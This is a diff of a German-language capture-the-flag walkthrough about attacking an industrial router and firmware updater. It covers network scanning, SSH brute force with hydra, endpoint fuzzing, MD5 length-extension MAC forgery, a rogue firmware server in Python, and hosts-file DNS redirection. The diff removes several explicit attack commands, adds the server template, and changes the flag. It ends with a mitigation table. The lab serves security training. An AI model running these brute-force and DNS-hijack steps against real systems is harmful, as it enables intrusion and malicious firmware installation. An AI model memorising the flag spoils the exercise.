@@ -74,7 +74,7 @@ Phase 6: MAC fälschen
     → Length Extension Attack gegen MD5(secret || firmware)
 
 Phase 7: Manipulierte Firmware einschleusen
-    → Rogue-Server auf dem Router starten, DNS umbiegen
+    → Rogue-Server starten, DNS umbiegen
 ```
 
 ---
@@ -88,13 +88,7 @@ Scanne das externe Netz nach aktiven Hosts und offenen Diensten.
 
 <details>
 <summary>Hinweis</summary>
-
-```bash
-nmap 172.22.0.0/24
-```
-
 Du solltest einen Host mit zwei offenen Diensten finden — darunter einen SSH-Dienst auf einem nicht-standardmäßigen Port.
-
 </details>
 
 ---
@@ -108,10 +102,6 @@ Erlange per SSH-Brute-Force Zugang zum Router. Achte auf den richtigen Port.
 
 <details>
 <summary>Hinweis</summary>
-
-```bash
-hydra -l root -P <wordlist> ssh://172.22.0.2 -s <port>
-```
 
 Das Passwort ist kurz. Du brauchst keine riesige Wörterbuchliste — eine kleine reicht. Schau, was auf deiner Kali-Maschine unter `/usr/share/dirb/wordlists/` bereitliegt.
 
@@ -158,9 +148,7 @@ Erkunde den Update-Server und finde heraus, welche Endpunkte er anbietet und wie
 <details>
 <summary>Hinweis</summary>
 
-```bash
-ffuf -w <wordlist> -u http://172.18.0.9:<port>/FUZZ
-```
+Verwende ein Fuzzing-Tool deiner Wahl, um mögliche Endpunkte aufzuspüren.
 
 Ein bestimmtes Verzeichnis verrät dir alles: verfügbare Endpunkte, erwartete Parameter — und die Länge eines bestimmten Secrets.
 
@@ -217,28 +205,86 @@ Das Ergebnis: eine manipulierte Firmware-Datei und ein neuer MAC, den der Daemon
 
 ## Phase 7 — Manipulierte Firmware einschleusen
 
-Der Daemon fragt alle 30 Sekunden: `update.cybics` — ein Hostname. Er löst über `/etc/hosts` auf. Du kontrollierst den Router. Das reicht.
+Der Daemon fragt alle 30 Sekunden: `update.cybics` — ein Hostname. Dieser wird vom DNS des Routers aufgelöst. Du kontrollierst den Router. Das reicht.
 
 Der elegante Weg: Du startest den Rogue-Server nicht auf deiner Angreifer-Maschine, sondern *auf dem Router selbst*. Der Daemon fragt localhost — und bekommt deine Firmware.
 
 ### Aufgabe
-Kopiere deine manipulierte Firmware und ein Server-Skript auf den Router, starte den Rogue-Server und biege die DNS-Auflösung um.
+Kopiere deine manipulierte Firmware und ein Server-Skript auf den Router oder die Angreifer-Maschine, starte den Rogue-Server und biege die DNS-Auflösung um.
 
 <details>
 <summary>Hinweis</summary>
 
-```bash
-# Dateien auf den Router kopieren
-scp -O -P <port> server.py forged.bin root@172.22.0.2:/root/
+Du kannst den folgenden Python-HTTP-Servercode als Vorlage nutzen:
+```python
+import json
+import os
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from pathlib import Path
+from urllib.parse import urlparse
 
-# Rogue-Server auf dem Router starten und DNS umbiegen
-ssh -p <port> root@172.22.0.2 "
-  <env-variablen> python3 /root/server.py &
-  echo '127.0.0.1 update.cybics' >> /etc/hosts
-"
+
+VERSION = os.environ.get("FIRMWARE_VERSION", "1.2.1")
+FIRMWARE_PATH = Path(
+    os.environ.get("FIRMWARE_PATH", "/opt/cybics/update-server/firmware/firmware.bin")
+)
+FIRMWARE_MAC = os.environ.get("FIRMWARE_MAC", "")
+
+
+def _json(handler: BaseHTTPRequestHandler, code: int, payload: dict) -> None:
+    body = json.dumps(payload).encode()
+    handler.send_response(code)
+    handler.send_header("Content-Type", "application/json")
+    handler.send_header("Content-Length", str(len(body)))
+    handler.end_headers()
+    handler.wfile.write(body)
+
+
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self) -> None:
+        path = urlparse(self.path).path
+        if path == "/api/v1/firmware/latest":
+            return _json(
+                self,
+                200,
+                {
+                    "version": VERSION,
+                    "mac": FIRMWARE_MAC,
+                    "url": f"/api/v1/firmware/download/{VERSION}",
+                },
+            )
+
+        prefix = "/api/v1/firmware/download/"
+        if path.startswith(prefix):
+            if path[len(prefix) :] != VERSION:
+                return _json(self, 404, {"detail": "Firmware version not found"})
+            if not FIRMWARE_PATH.is_file():
+                return _json(self, 500, {"detail": "Firmware file is not available"})
+            if not FIRMWARE_MAC:
+                return _json(self, 500, {"detail": "Firmware MAC is not configured"})
+
+            firmware = FIRMWARE_PATH.read_bytes()
+            self.send_response(200)
+            self.send_header("Content-Type", "application/octet-stream")
+            self.send_header("Content-Length", str(len(firmware)))
+            self.send_header("X-Firmware-MAC", FIRMWARE_MAC)
+            self.end_headers()
+            self.wfile.write(firmware)
+            return
+
+        _json(self, 404, {"detail": "Not found"})
+
+    def log_message(self, *_: object) -> None:
+        pass
+
+
+if __name__ == "__main__":
+    host = os.environ.get("HOST", "0.0.0.0")
+    port = int(os.environ.get("PORT", "6689"))
+    ThreadingHTTPServer((host, port), Handler).serve_forever()
 ```
 
-Wenn alles klappt, siehst du im Daemon-Log `** Programming Finished **`. Der Flag ist aktiv.
+Wenn alles klappt, siehst du die Flag in den Logs vom Docker-Container `firmware-updater`.
 
 </details>
 
@@ -247,7 +293,7 @@ Wenn alles klappt, siehst du im Daemon-Log `** Programming Finished **`. Der Fla
 ## Flag
 
 ```
-CybICS(malicious_firmware_injected)
+CybICS(m4lic1Ous_FIRMwar3_update)
 ```
 
 ---
@@ -256,14 +302,14 @@ CybICS(malicious_firmware_injected)
 
 Diese Challenge illustriert eine Angriffskette, die sich so oder ähnlich in echten ICS-Umgebungen findet:
 
-| Schwachstelle | Auswirkung | Gegenmaßnahme |
-|---|---|---|
-| Schwaches Router-Passwort | Initial Access per Brute-Force | Starke, einzigartige Credentials; keine Default-Passwörter |
-| `MD5(secret \|\| data)` als MAC | Length Extension Attack ohne Key | HMAC verwenden (z. B. HMAC-SHA256) |
-| HTTP statt HTTPS für Updates | Traffic-Analyse / Man-in-the-Middle | TLS mit Zertifikatsvalidierung |
-| Fehlende Firmware-Signatur | Beliebige Firmware einschleusen | Asymmetrische Signaturen (z. B. Ed25519) + Secure Boot |
-| Exponierte API-Dokumentation | Endpoint-Discovery vereinfacht | Produktion ohne `/docs`-Endpunkt deployen |
-| Schreibzugriff auf `/etc/hosts` | DNS-Spoofing lokal möglich | Minimale Schreibrechte; Read-only-Rootfs |
+| Schwachstelle                       | Auswirkung | Gegenmaßnahme |
+|-------------------------------------|---|---|
+| Schwaches Router-Passwort           | Initial Access per Brute-Force | Starke, einzigartige Credentials; keine Default-Passwörter |
+| `MD5(secret \|\| data)` als MAC     | Length Extension Attack ohne Key | HMAC verwenden (z. B. HMAC-SHA256) |
+| HTTP statt HTTPS für Updates        | Traffic-Analyse / Man-in-the-Middle | TLS mit Zertifikatsvalidierung |
+| Fehlende Firmware-Signatur          | Beliebige Firmware einschleusen | Asymmetrische Signaturen (z. B. Ed25519) + Secure Boot |
+| Exponierte API-Dokumentation        | Endpoint-Discovery vereinfacht | Produktion ohne `/docs`-Endpunkt deployen |
+| Zugriff auf Router | DNS-Spoofing möglich | Minimale Schreibrechte; Read-only-Rootfs |
 
 ---
 
